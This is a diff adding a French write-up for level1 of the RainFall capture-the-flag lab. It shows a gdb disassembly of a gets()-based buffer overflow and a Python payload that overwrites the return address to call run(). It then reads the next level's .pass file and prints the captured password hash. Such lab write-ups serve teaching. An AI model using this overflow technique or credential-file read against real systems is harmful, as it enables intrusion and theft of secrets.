@@ -1,0 +1,43 @@
+(gdb) disass main
+Dump of assembler code for function main:
+   0x08048480 <+0>:	push   %ebp
+   0x08048481 <+1>:	mov    %esp,%ebp
+   0x08048483 <+3>:	and    $0xfffffff0,%esp
+   0x08048486 <+6>:	sub    $0x50,%esp
+   0x08048489 <+9>:	lea    0x10(%esp),%eax
+   0x0804848d <+13>:	mov    %eax,(%esp)
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>
+   0x08048495 <+21>:	leave
+   0x08048496 <+22>:	ret
+
+Nous pouvons constater qu'une allocation a lieu puis un call a gets.
+Quand nous lançons level1, il attends bien sur l'entrée standard.
+L'allocation est de 0x50 soit 80 en decimal, -4 pour stocker le pointeur, le buffer est donc de 76.
+Maintenant nous allons preparer une attaque dans le but d'executer un call a run, pour cela nous devons recuperer l'addresse de la fonction run.
+
+(gdb) break main
+Breakpoint 1 at 0x8048483
+(gdb) p run
+$1 = {<text variable, no debug info>} 0x8048444 <run>
+
+Preparation :
+(attention il faut chmod 777 notre home avant: chmod 777 /home/user/level1/ )
+
+python -c 'print "A"*76 + "\x44\x84\x04\x08"' > file
+
+Execution : 
+cat file - | ./level1
+
+(on specifie - pour lire sur lentree standard apres avoir output le contenu de file.)
+
+puis :
+cat /home/user/level2/.pass
+
+
+
+level1@RainFall:~$ cat file - | ./level1
+Good... Wait what?
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+
